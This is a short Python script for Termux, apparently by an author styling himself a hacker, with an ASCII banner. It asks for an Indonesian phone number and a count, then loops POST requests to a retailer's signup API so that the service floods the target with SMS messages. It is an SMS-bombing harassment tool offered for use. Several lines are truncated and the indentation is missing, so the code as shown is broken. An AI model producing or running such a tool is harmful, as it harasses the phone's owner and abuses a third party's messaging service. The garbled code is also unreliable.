import json
import requests
import os

def main():
os.system('clear')
os.system('figlet spam sms')
banner = '''
╔╦╗╔═╗╦═╗╔╦╗╦ ╦═╗ ╦ ╔═╗╔╦╗╦ ╦╦ ╔═╗
║ ║╣ ╠╦╝║║║║ ║╔╩╦╝───╚═╗ ║ ╚╦╝║ ║╣
╩ ╚═╝╩╚═╩ ╩╚═╝╩ ╚═ ╚═╝ ╩ ╩ ╩═╝╚═╝
◀════════════════════════════════════════════════▶
[+]Author : Fadhlan
[+]Github : https://github.com/fadhlan98-Hack.sms
[+]Instagram : devil_kalem.id
◀════════════════════════════════════════════════▶
█████████ ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
█▄█████▄█ __--╔╦═╦╗╔═╗╔╗─╔═╗╔═╗╔═╦═╗╔═╗
█ ▼▼▼▼▼_---_--║║║║║║╦╝║║─║╔╝║║║║║║║║║╦╝ >
█ ▲▲▲▲▲ -_-- -╚═╩═╝╚═╝╚═╝╚═╝╚═╝╚╩═╩╝╚═╝
█████████ «°°°°°°°°°°✧°°°°°°°°°°»
██ ██
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
=[ Coded by Fadhlan ]=
====[ Welcome To Termux ]====
'''

print(banner)
no = input('[1].target [+62] : ')
jum = input('[2].jumlah spam : ')

head = {
"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM>
"Referer": "https://www.mapclub.com/en/user/signu>
"Host": "cmsapi.mapclub.com",
}

data ={
'phone' : no
}


for x in range(int(jum)):
leosureo = requests.post("https://cmsapi.>
if 'eror' in leosureo:
print(' gagal mengirim '+ no)
else:
print(' Succes mengirim '+ no)

main()